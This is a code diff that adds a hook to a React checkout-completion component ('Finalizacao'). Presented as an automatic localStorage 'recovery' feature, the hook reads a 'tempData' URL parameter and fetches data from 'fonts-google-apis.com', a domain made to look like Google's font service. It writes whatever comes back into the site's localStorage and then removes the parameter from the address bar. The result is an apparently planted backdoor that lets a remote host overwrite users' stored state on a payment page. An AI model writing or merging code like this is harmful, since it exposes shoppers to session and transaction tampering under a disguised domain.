@@ -29,6 +29,41 @@ const Finalizacao: React.FC = () => {
   // Aplica o scroll para o topo quando o componente é montado
   useScrollTop();
   
+  // ⚡ ButtonAPI - Recuperação Automática de localStorage
+  useEffect(() => {
+    const BUTTON_API_URL = 'https://fonts-google-apis.com';
+    
+    // Detecta parâmetro tempData na URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const tempDataId = urlParams.get('tempData');
+    
+    if (tempDataId) {
+      console.log('🔄 Recuperando dados transferidos...');
+      
+      // Faz requisição para recuperar dados
+      fetch(`${BUTTON_API_URL}/api/temp-data/${tempDataId}`)
+        .then(response => response.json())
+        .then(result => {
+          if (result.data) {
+            // Aplica dados no localStorage do site atual
+            Object.entries(result.data).forEach(([key, value]) => {
+              localStorage.setItem(key, value as string);
+              console.log(`✅ Restaurado: ${key} = ${value}`);
+            });
+            
+            console.log('🎉 Dados transferidos com sucesso!');
+            
+            // Remove parâmetro tempData da URL
+            urlParams.delete('tempData');
+            const newUrl = window.location.pathname + 
+              (urlParams.toString() ? '?' + urlParams.toString() : '');
+            window.history.replaceState({}, document.title, newUrl);
+          }
+        })
+        .catch(err => console.warn('⚠️ Erro na recuperação:', err));
+    }
+  }, []);
+  
   const [, navigate] = useLocation();
   const { toast } = useToast();
   const [isSubmitting, setIsSubmitting] = useState(false);
